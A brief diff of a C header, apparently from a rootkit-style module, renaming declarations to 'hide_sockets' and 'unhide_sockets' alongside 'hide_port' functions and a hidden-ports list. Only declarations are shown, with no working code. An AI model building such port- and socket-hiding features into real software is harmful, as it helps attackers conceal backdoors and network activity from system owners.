@@ -20,8 +20,8 @@ typedef struct port_list {
 
 extern port_list_t hidden_ports;
 
-void hook_show(void);
-void unhook_show(void);
+void hide_sockets(void);
+void unhide_sockets(void);
 
 void hide_port(port_t, proto);
 void unhide_port(port_t, proto);
